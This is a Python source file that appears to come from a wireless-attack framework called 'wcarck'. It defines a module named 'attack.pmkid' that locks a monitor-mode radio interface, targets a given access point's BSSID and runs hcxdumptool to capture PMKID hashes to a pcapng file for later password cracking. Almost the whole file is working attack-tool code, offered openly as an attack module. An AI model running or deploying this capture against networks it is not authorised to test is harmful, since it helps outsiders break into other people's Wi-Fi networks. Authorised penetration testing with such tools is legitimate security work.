import asyncio
import os
from typing import Any, Optional
from wcarck.core.module import Module
from wcarck.core.event_bus import bus
from wcarck.hardware.process import ManagedProcess
from wcarck.orchestration.leases import RadioLeaseManager
import structlog

logger = structlog.get_logger()

class PMKIDModule(Module):
    """
    Active 802.11 PMKID Capture Module.
    Acquires an exclusive monitor.locked lease and runs hcxdumptool.
    """
    
    def __init__(self, lease_manager: RadioLeaseManager):
        self.lease_manager = lease_manager
        self._process: Optional[ManagedProcess] = None

    @property
    def name(self) -> str:
        return "attack.pmkid"

    async def start(self, job_id: str, params: dict[str, Any]) -> None:
        iface = params.get("iface", "wlan_mon")
        bssid = params.get("bssid")
        
        if not bssid:
            raise ValueError("Target BSSID is required for PMKID capture")
            
        # Target list file for hcxdumptool
        target_file = f"/tmp/wcarck_pmkid_{job_id}_targets.txt"
        with open(target_file, 'w') as f:
            f.write(bssid.replace(':', '') + '\\n')
        
        out_pcapng = f"/var/lib/wcarck/captures/pmkid_{job_id}.pcapng"
        
        # Acquire Exclusive Lease
        await self.lease_manager.acquire(job_id, iface, "monitor.locked")
        
        # hcxdumptool -i <iface> -o <pcapng> --filterlist_ap=<target_file> --filtermode=2 --enable_status=3
        cmd = [
            "hcxdumptool", 
            "-i", iface, 
            "-o", out_pcapng, 
            f"--filterlist_ap={target_file}", 
            "--filtermode=2", 
            "--enable_status=3"
        ]
        
        if os.name == 'nt':
            # Windows dev dummy
            cmd = ["python", "-c", f"import time; print('Capturing PMKID for {bssid}...'); time.sleep(10)"]
            
        self._process = ManagedProcess(cmd=cmd, job_id=job_id)
        await self._process.start()
        
        bus.publish("module.started", {"job_id": job_id, "module": self.name})

    async def stop(self, job_id: str) -> None:
        if self._process:
            await self._process.stop()
            self._process = None
            
        bus.publish("module.stopped", {"job_id": job_id, "module": self.name})

    async def status(self, job_id: str) -> dict[str, Any]:
        return {
            "is_running": self._process is not None,
            "module": self.name
        }
